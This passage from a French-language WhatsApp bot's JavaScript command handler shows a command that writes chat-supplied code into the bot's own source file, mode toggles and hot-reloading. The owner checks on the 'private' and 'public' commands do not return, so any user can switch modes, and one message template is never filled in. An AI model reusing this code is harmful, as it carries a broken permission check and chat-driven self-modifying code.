                        const codeAsk = data.slice(0, insert) + '\n\n' + caseAsk + '\n' + data.slice(insert);
                        fs.writeFile(nameFile, codeAsk, 'utf8', (err) => {
                            if (err) {
                                m.reply('Une erreur est survenue lors de l\'écriture du fichier : ' + err);
                            } else {
                                m.reply('Nouveau cas ajouté avec succès.');
                            }
                        });
                    } else {
                        m.reply('Impossible de trouver la déclaration switch dans le fichier.');
                    }
                });
             }
                break;
                
            case "private": {
                await ask.sendMessage(m.chat, { react: { text: "🔒", key: m.key } });
                if (!isCreator) m.reply(mess.owner);
                ask.public = false;
                m.reply('𝐌𝐎𝐃𝐄 𝐏𝐑𝐈𝐕𝐄́ 𝐀𝐂𝐓𝐈𝐕𝐄');
                   }
                break;

            case "public": {
                await ask.sendMessage(m.chat, { react: { text: "🔓", key: m.key } });
                if (!isCreator) m.reply(mess.owner);
                ask.public = true;
                m.reply('𝐌𝐎𝐃𝐄 𝐏𝐔𝐁𝐋𝐈𝐂 𝐀𝐂𝐓𝐈𝐕𝐄');
                }
                break;
default: {
    await ask.sendMessage(m.chat, { react: { text: "❌", key: m.key } });

    await ask.sendMessage(m.key.remoteJid, {
        gifPlayback: false,
        image: { url: "welcome.png" },
        caption: "> Commande ${command} non reconnue, tapez *.menu* pour voir les options disponibles."
    });
    break;
}

}
    } catch (err) {        
         
        
        console.log(chalk.red("Erreur dans coeur.js =>"), err);
    }
};

let file = require.resolve(__filename);
fs.watchFile(file, () => {
    fs.unwatchFile(file);
    console.log(chalk.whiteBright('├'), chalk.keyword("red")("[ UPDATE ]"), __filename);
    delete require.cache[file];
    require(file);
});